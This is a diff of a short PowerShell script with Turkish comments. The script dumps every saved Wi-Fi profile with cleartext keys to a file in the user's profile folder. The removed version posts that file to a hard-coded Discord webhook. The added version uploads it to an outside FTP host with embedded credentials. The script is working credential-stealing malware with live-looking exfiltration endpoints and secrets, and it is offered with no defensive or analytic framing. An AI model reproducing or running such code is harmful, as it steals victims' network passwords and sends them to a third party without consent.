@@ -1,18 +1,21 @@
-# 1. Wi-Fi şifrelerini dosyaya yaz
-netsh wlan show profile name="*" key=clear > "$env:USERPROFILE\wifipass.txt"
+# Wi-Fi profillerini dosyaya yaz
+$localFile = "$env:USERPROFILE\wifipass.txt"
+netsh wlan show profile name="*" key=clear > $localFile
 
-# 2. Dosya içeriğini oku
-$filePath = "$env:USERPROFILE\wifipass.txt"
-$fileContent = Get-Content $filePath -Raw
+# FTP bilgileri
+$ftpUrl = "ftp://ftpupload.net/wifipass.txt"
+$ftpUser = "if0_39536575"
+$ftpPass = "tThCkj4zwg"
 
-# 3. Özel karakterleri JSON için escape et (çift tırnak ve ters eğik çizgi)
-$escapedContent = $fileContent -replace '\\', '\\\\' -replace '"', '\"'
+# FTP bağlantısı için WebClient oluştur
+$webclient = New-Object System.Net.WebClient
+$webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)
 
-# 4. JSON'u elle oluştur
-$jsonPayload = "{""content"": ""```$escapedContent```"" }"
-
-# 5. Webhook adresin
-$webhookUrl = "https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN"
-
-# 6. Discord'a gönder
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
+try {
+    # Dosyayı FTP'ye yükle
+    $webclient.UploadFile($ftpUrl, "STOR", $localFile)
+    Write-Host "Dosya başarıyla FTP'ye yüklendi."
+}
+catch {
+    Write-Host "Hata oluştu: $_"
+}
